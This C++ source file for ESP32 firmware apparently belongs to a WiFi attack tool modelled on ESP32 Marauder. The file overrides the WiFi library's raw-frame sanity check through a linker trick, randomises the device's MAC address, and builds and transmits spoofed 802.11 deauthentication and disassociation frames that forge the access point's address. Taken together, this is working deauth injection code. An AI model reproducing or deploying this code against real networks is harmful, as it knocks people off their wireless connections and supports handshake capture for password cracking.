// WSL Bypasser - Bypass ESP32 WiFi frame validation for raw TX
// Based on ESP32 Marauder's approach using -zmuldefs linker flag
// 
// The ESP32 WiFi library checks ieee80211_raw_frame_sanity_check() before
// transmitting raw frames. By defining our own version and using -zmuldefs,
// our function takes precedence over the library version.

#include "wsl_bypasser.h"
#include <esp_wifi.h>
#include <esp_system.h>
#include <esp_random.h>

// The raw-frame sanity-check override (for deauth injection) globally replaces a
// libnet80211 symbol via -zmuldefs. That is suspected of breaking normal STA
// association (AUTH_FAIL). Gate it behind OINK_DEAUTH_OVERRIDE so we can build a
// clean WiFi-capable image to isolate the issue. When disabled, deauth TX won't
// pass the sanity check, but STA WiFi (wpa-sec upload) works.
#if defined(OINK_DEAUTH_OVERRIDE)
extern "C" {
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;  // allow all frame types
}
}
#endif

namespace WSLBypasser {

bool initialized = false;

// TX result tracking so we can verify deauth frames are actually accepted by the
// radio (vs silently rejected by the sanity check / a failed set_mac).
static volatile uint32_t s_txOk   = 0;
static volatile uint32_t s_txFail = 0;
static volatile int      s_lastErr = 0;
uint32_t txOkCount()   { return s_txOk; }
uint32_t txFailCount() { return s_txFail; }
int      lastTxErr()   { return s_lastErr; }

// Inject a raw frame. With the -zmuldefs sanity-check override compiled in, the
// frame (source MAC already spoofed in its addr2 field) transmits directly — no
// runtime MAC change needed (which can't be done in promiscuous mode anyway).
void rawTx(const uint8_t* srcMac, const uint8_t* frame, size_t len) {
    (void)srcMac;
    esp_err_t txErr = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    s_lastErr = (int)txErr;
    if (txErr == ESP_OK) s_txOk++; else s_txFail++;
}

void init() {
    if (initialized) return;
    
    // Log that bypass is active
    Serial.println("[WSL] Frame validation bypass active (-zmuldefs)");
    initialized = true;
}

void randomizeMAC() {
    uint8_t mac[6];
    
    // Generate random MAC using hardware RNG
    esp_fill_random(mac, 6);
    
    // Set locally administered bit (bit 1 of first byte) and clear multicast bit (bit 0)
    // This marks it as a valid unicast locally-administered address
    mac[0] = (mac[0] & 0xFC) | 0x02;
    
    // Apply the new MAC address
    esp_err_t result = esp_wifi_set_mac(WIFI_IF_STA, mac);
    
    if (result == ESP_OK) {
        Serial.printf("[WSL] MAC randomized: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    } else {
        Serial.printf("[WSL] MAC randomization failed: %d\n", result);
    }
}

bool sendDeauthFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    // Ensure we're on the right channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Deauth frame (26 bytes)
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth (subtype 0x0C)
        0x00, 0x00,  // Duration
        // Addr1 (DA - destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Addr2 (SA - source, spoofed as BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Addr3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Sequence control
        0x00, 0x00,
        // Reason code (2 bytes, little endian)
        0x07, 0x00   // Class 3 frame received from non-associated station
    };
    
    // Set addresses
    memcpy(deauthPacket + 4, staMac, 6);   // Destination
    memcpy(deauthPacket + 10, bssid, 6);   // Source (AP)
    memcpy(deauthPacket + 16, bssid, 6);   // BSSID
    deauthPacket[24] = reason;             // Reason code
    
    // Try to send
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    return (result == ESP_OK);
}

bool sendDisassocFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* staMac, uint8_t reason) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Disassoc frame (26 bytes) - same structure as deauth
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (subtype 0x0A)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code: Disassociated because station leaving
    };
    
    memcpy(disassocPacket + 4, staMac, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    return (result == ESP_OK);
}

}
